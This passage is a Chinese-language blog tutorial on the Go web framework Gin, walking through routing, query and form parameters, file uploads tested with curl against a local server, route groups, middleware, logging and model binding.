        <content type="html"><![CDATA[<h2 id="Gin学习"><a href="#Gin学习" class="headerlink" title="Gin学习"></a>Gin学习</h2><h3 id="最简单的实例"><a href="#最简单的实例" class="headerlink" title="最简单的实例"></a>最简单的实例</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">c.JSON(http.StatusOK, gin.H{</span><br><span class="line"><span class="string">"message"</span>: <span class="string">"ok!"</span>,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="获取路由中的参数"><a href="#获取路由中的参数" class="headerlink" title="获取路由中的参数"></a>获取路由中的参数</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.Any(<span class="string">"/u/:name/*pass"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">name := c.Param(<span class="string">"name"</span>)</span><br><span class="line">pass := c.Param(<span class="string">"pass"</span>)</span><br><span class="line">c.JSON(http.StatusOK, gin.H{</span><br><span class="line"><span class="string">"name"</span>:name,</span><br><span class="line"><span class="string">"pass"</span>:pass,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>访问：<code>/u/qiyou/abc</code>，返回的是<code>{"name":"qiyou","pass":"/abc"}</code>，注意abc这里有一个斜杠</p><h3 id="获取GET参数"><a href="#获取GET参数" class="headerlink" title="获取GET参数"></a>获取GET参数</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">name := c.DefaultQuery(<span class="string">"name"</span>,<span class="string">"qiyou"</span>)</span><br><span class="line">pass:=c.Query(<span class="string">"pass"</span>)</span><br><span class="line">c.JSON(http.StatusOK, gin.H{</span><br><span class="line"><span class="string">"name"</span>:name,</span><br><span class="line"><span class="string">"pass"</span>:pass,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>DefaultQuery</code>: 如果请求的参数没有包含key，那么默认为第二个参数。</p><h3 id="获取POST参数"><a href="#获取POST参数" class="headerlink" title="获取POST参数"></a>获取POST参数</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">name := c.DefaultPostForm(<span class="string">"name"</span>,<span class="string">"qiyou"</span>)</span><br><span class="line">pass:=c.PostForm(<span class="string">"pass"</span>)</span><br><span class="line">c.JSON(http.StatusOK, gin.H{</span><br><span class="line"><span class="string">"name"</span>:name,</span><br><span class="line"><span class="string">"pass"</span>:pass,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>DefaultPostForm</code>: 如果请求的参数没有包含key，那么默认为第二个参数。</p><h3 id="同时获取GET和POST参数"><a href="#同时获取GET和POST参数" class="headerlink" title="同时获取GET和POST参数"></a>同时获取GET和POST参数</h3><p>注意：GET路由不支持POST请求，如果发送POST那么将会放回404，POST路由也是如此</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">name := c.DefaultPostForm(<span class="string">"name"</span>,<span class="string">"qiyou"</span>)</span><br><span class="line">pass:=c.PostForm(<span class="string">"pass"</span>)</span><br><span class="line">age:=c.Query(<span class="string">"age"</span>)</span><br><span class="line">sex:=c.DefaultQuery(<span class="string">"sex"</span>,<span class="string">"male"</span>)</span><br><span class="line">c.JSON(http.StatusOK, gin.H{</span><br><span class="line"><span class="string">"name"</span>:name,</span><br><span class="line"><span class="string">"pass"</span>:pass,</span><br><span class="line"><span class="string">"age"</span>:age,</span><br><span class="line"><span class="string">"sex"</span>:sex,</span><br><span class="line">})</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">"/upload"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">file,_:=c.FormFile(<span class="string">"files"</span>)</span><br><span class="line">c.String(http.StatusOK,file.Filename)</span><br><span class="line"><span class="keyword">if</span> err:=c.SaveUploadedFile(file,<span class="string">"./abc.txt"</span>);err!=<span class="literal">nil</span>{</span><br><span class="line">c.String(http.StatusInternalServerError,err.Error())</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.String(http.StatusOK,<span class="string">"Success!"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>测试：<code>curl -F "files=@abc.txt" http://192.168.43.212:7777/upload</code></p><p>多文件上传<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">"/upload"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">all,_:=c.MultipartForm()</span><br><span class="line">files:=all.File[<span class="string">"files[]"</span>]</span><br><span class="line"><span class="keyword">for</span> _,file:=<span class="keyword">range</span> files{</span><br><span class="line"><span class="keyword">if</span> err:=c.SaveUploadedFile(file,<span class="string">"./abc.txt"</span>);err!=<span class="literal">nil</span>{</span><br><span class="line">c.String(http.StatusInternalServerError,err.Error())</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.String(http.StatusOK,<span class="string">"Success,"</span>+file.Filename)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>测试：<code>curl -F "files[]=@main.go" -F "files[]=@abc.txt" http://192.168.43.212:7777/upload</code></p><h3 id="路由分组"><a href="#路由分组" class="headerlink" title="路由分组"></a>路由分组</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.Default()</span><br><span class="line">blog:=r.Group(<span class="string">"blog"</span>)</span><br><span class="line">{</span><br><span class="line">blog.GET(<span class="string">"/comments/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{ <span class="comment">//等价于/blog/comments/</span></span><br><span class="line">c.String(http.StatusOK,<span class="string">"comments"</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">blog.GET(<span class="string">"/submits/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{ <span class="comment">//等价于/blog/submits/</span></span><br><span class="line">c.String(http.StatusOK,<span class="string">"submits"</span>)</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">www:=r.Group(<span class="string">"www"</span>)</span><br><span class="line">{</span><br><span class="line">www.GET(<span class="string">"/users/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{ <span class="comment">//等价于/www/users/</span></span><br><span class="line">c.String(http.StatusOK,<span class="string">"users"</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">www.GET(<span class="string">"/posts"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{ <span class="comment">//等价于/www/posts/</span></span><br><span class="line">c.String(http.StatusOK,<span class="string">"posts"</span>)</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">"0.0.0.0:7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="自定义中间件"><a href="#自定义中间件" class="headerlink" title="自定义中间件"></a>自定义中间件</h3><p>使用<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r := gin.New()</span><br></pre></td></tr></tbody></table></figure><p></p><p>代替<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r := gin.Default() // 默认启动方式，包含 Logger、Recovery 中间件</span><br></pre></td></tr></tbody></table></figure><p></p><p>简单的实例<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">r := gin.New()</span><br><span class="line"><span class="comment">//添加中间件</span></span><br><span class="line">r.Use(gin.Recovery())</span><br><span class="line">r.Use(gin.Logger())</span><br><span class="line">r.GET(<span class="string">"/test/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.String(<span class="number">200</span>,<span class="string">"test"</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">test:=r.Group(<span class="string">"/www/"</span>)</span><br><span class="line"><span class="comment">//给路由组添加中间件</span></span><br><span class="line">test.Use(gin.Recovery())</span><br><span class="line">test.Use(gin.Logger())</span><br><span class="line">{</span><br><span class="line">test.GET(<span class="string">"/abc/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.String(<span class="number">200</span>,<span class="string">"abc"</span>)</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line">r.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">gin.DisableConsoleColor()</span><br><span class="line">f,_:=os.Create(<span class="string">"log.log"</span>)</span><br><span class="line"><span class="comment">//只写入文件，不在控制台输出</span></span><br><span class="line"><span class="comment">//gin.DefaultWriter = io.MultiWriter(f)</span></span><br><span class="line">gin.DefaultWriter = io.MultiWriter(f,os.Stdout) <span class="comment">//既写入文件，也在控制台输出。</span></span><br><span class="line">r:=gin.Default()</span><br><span class="line">r.GET(<span class="string">"/test/"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line">c.String(<span class="number">200</span>,<span class="string">"test"</span>)</span><br><span class="line">})</span><br><span class="line">r.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>自定义日志格式，输出类似于apache日志格式<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.New()</span><br><span class="line"></span><br><span class="line"><span class="comment">// LoggerWithFormatter 中间件会将日志写入 gin.DefaultWriter</span></span><br><span class="line"><span class="comment">// By default gin.DefaultWriter = os.Stdout</span></span><br><span class="line">router.Use(gin.LoggerWithFormatter(<span class="function"><span class="keyword">func</span><span class="params">(param gin.LogFormatterParams)</span> <span class="title">string</span></span> {</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你的自定义格式</span></span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">"%s - [%s] \"%s %s %s %d %s \"%s\" %s\"\n"</span>,</span><br><span class="line">param.ClientIP,</span><br><span class="line">param.TimeStamp.Format(time.RFC1123),</span><br><span class="line">param.Method,</span><br><span class="line">param.Path,</span><br><span class="line">param.Request.Proto,</span><br><span class="line">param.StatusCode,</span><br><span class="line">param.Latency,</span><br><span class="line">param.Request.UserAgent(),</span><br><span class="line">param.ErrorMessage,</span><br><span class="line">)</span><br><span class="line">}))</span><br><span class="line">router.Use(gin.Recovery())</span><br><span class="line"></span><br><span class="line">router.GET(<span class="string">"/ping"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">"pong"</span>)</span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="模型绑定"><a href="#模型绑定" class="headerlink" title="模型绑定"></a>模型绑定</h3><p>要注意几个点是：</p><ol><li>tag必须要有，以kv的形式存在，例如：<code>json:"Fieldame"</code>,而且tag里面的<code>key-value</code>冒号之间不能用空格</li><li>form表示的是<strong>GET和POST</strong>，json表示的是<strong>json</strong>，xml表示的是<strong>xml</strong></li><li><code>binding:"required"</code>表示的是一定要有值，</li></ol><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">User     <span class="keyword">string</span> <span class="string">`form:"user" json:"user" xml:"user"  binding:"required"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`form:"password" json:"password" xml:"password" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.New()</span><br><span class="line"><span class="keyword">var</span> test Login</span><br><span class="line">router.POST(<span class="string">"/loginJSON"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"><span class="keyword">if</span> err:=c.ShouldBindJSON(&amp;test);err!=<span class="literal">nil</span>{</span><br><span class="line">c.JSON(<span class="number">400</span>,gin.H{<span class="string">"message"</span>:<span class="string">"login failed"</span>})</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"user"</span>:test.User,</span><br><span class="line"><span class="string">"pass"</span>:test.Password,</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">router.POST(<span class="string">"/loginForm"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"><span class="keyword">if</span> err:=c.ShouldBind(&amp;test);err!=<span class="literal">nil</span>{</span><br><span class="line">c.JSON(<span class="number">400</span>,gin.H{<span class="string">"message"</span>:<span class="string">"login failed"</span>})</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"user"</span>:test.User,</span><br><span class="line"><span class="string">"pass"</span>:test.Password,</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果只想绑定GET参数不绑定POST参数，可以使用<code>ShouldBindQuery</code><br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> {</span><br><span class="line">User     <span class="keyword">string</span> <span class="string">`form:"user" binding:"required"`</span></span><br><span class="line">Password <span class="keyword">string</span> <span class="string">`form:"password" binding:"required"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">router := gin.New()</span><br><span class="line"><span class="keyword">var</span> test Login</span><br><span class="line">router.POST(<span class="string">"/login"</span>,<span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span>{</span><br><span class="line"><span class="keyword">if</span> err:=c.ShouldBindQuery(&amp;test);err!=<span class="literal">nil</span>{</span><br><span class="line">c.JSON(<span class="number">400</span>,gin.H{<span class="string">"message"</span>:<span class="string">"login failed"</span>})</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">c.JSON(<span class="number">200</span>,gin.H{</span><br><span class="line"><span class="string">"user"</span>:test.User,</span><br><span class="line"><span class="string">"pass"</span>:test.Password,</span><br><span class="line">})</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">})</span><br><span class="line">router.Run(<span class="string">":7777"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>接收POST或者GET<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span 